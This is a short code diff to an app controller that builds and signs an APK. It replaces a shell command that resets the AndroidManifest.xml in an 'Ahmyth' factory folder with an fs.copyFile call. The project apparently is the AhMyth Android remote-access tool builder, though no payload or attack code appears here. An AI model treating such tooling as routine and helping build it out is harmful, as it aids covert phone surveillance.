@@ -2823,12 +2823,15 @@ app.controller("AppCtrl", ($scope) => {
 
                         fs.unlink(path.join(outputPath, CONSTANTS.apkName), (err) => {
                             if (err) throw err;
-
+                              
                             $appCtrl.Log('Apk built successfully', CONSTANTS.logStatus.SUCCESS);
-                            $appCtrl.Log("The apk has been built on " + path.join(outputPath, CONSTANTS.signedApkName), CONSTANTS.logStatus.SUCCESS);
-                            $appCtrl.Log();
-                            exec("cd app/app/Factory/Ahmyth/ && rm -rf AndroidManifest.xml && cd .. && cp Vault/AndroidManifest.xml.ahmyth Ahmyth/AndroidManifest.xml ")
-                        });
+                            $appCtrl.Log("The apk has been built on " + path.join(outputPath, CONSTANTS.signedApkName), CONSTANTS.logStatus.SUCCESS);   
+                            $appCtrl.Log();                     
+                            fs.copyFile(path.join(CONSTANTS.vaultFolderPath, "AndroidManifest.xml"), path.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), (err) => {
+                              if (err) throw err;
+
+                            });
+                          });
                     });
             });
 
